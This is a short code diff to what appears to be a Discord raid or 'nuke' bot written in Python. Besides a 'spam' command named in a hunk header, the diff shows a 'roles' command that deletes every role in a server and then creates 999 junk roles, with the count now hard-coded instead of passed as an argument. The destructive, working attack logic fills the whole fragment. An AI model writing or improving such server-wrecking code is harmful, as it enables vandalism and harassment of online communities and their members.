@@ -104,7 +104,7 @@ async def spam(ctx):
         
 
 @bot.command(pass_context=True)
-async def roles(ctx, amount):
+async def roles(ctx):
   guild = ctx.message.guild
   for role in guild.roles:
     try:
@@ -113,7 +113,7 @@ async def roles(ctx, amount):
     except:
       pass
       print(f"{Fore.RED}Role: {role} could not be deleted")
-  for i in range(amount):
+  for i in range(999):
     try:
       await guild.create_role(name=rolenames)
       print(f"{Fore.GREEN}Role has been created")
